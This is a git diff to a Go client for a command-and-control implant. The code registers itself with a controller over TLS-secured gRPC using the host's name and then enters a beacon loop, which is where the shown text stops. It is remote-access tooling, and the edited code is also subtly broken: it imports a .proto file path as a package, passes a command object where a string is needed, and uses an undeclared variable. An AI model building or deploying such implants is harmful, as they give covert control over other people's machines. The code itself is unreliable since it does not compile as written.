@@ -13,15 +13,12 @@ import (
 	"strings"
 	"time"
 
-	"github.com/blackhat-go/bhg/ch-14/grpcapi"
+	"github.com/matt-culbert/Switchblade/grcpapi/implant.proto"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 )
 
 // Register holds the beacon name
-type Register struct {
-	Name    string
-}
 
 func loadTLSCredentials() (credentials.TransportCredentials, error) {
 	// Load certificate of the CA who signed server's certificate
@@ -58,9 +55,9 @@ func main() {
 		client grpcapi.ImplantClient
 	)
 
-	name = exec.Command("hostname") // generate a client name on first launch
-	name := name
-	whoami := Register{Name: name}
+	var name = exec.Command("hostname") // generate a client name on first launch
+
+	whoami.Register = name // register is defined in proto as a string
 
 	tlsCredentials, err := loadTLSCredentials()
 	if err != nil {
@@ -73,10 +70,10 @@ func main() {
 		log.Fatal(err)
 	}
 	defer conn.Close()
+	ctx := context.Background()
 
 	client = grpcapi.NewImplantClient(conn)
-	client.RegisterImplant(whoami)
-	ctx := context.Background()
+	client.RegisterImplant(ctx, whoami) // RegisterImplant is defined in proto as taking in a string and has no output
 
 	for {
 		var req = new(grpcapi.Empty)
